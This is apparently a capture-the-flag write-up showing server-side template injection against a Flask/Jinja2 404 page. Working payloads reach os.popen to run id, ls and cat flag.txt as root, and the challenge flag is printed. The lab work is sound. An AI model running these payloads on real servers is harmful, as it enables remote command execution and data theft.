-> SSTI flask jinja2

Route: `GET /`
```html
Site still under construction
Proudly powered by Flask/Jinja2
```

Route: `GET /a{{7*7}}`
```
Error 404
The page 'a49' could not be found
```

Route: `GET /a{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
```
Error 404
The page 'auid=0(root) gid=0(root) groups=0(root) ' could not be found
```

Route: `GET /a{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
```
Error 404
The page 'abin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found
```

Route: `GET /a{{request.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()}}`
```
The page 'aHTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} ' could not be found
```
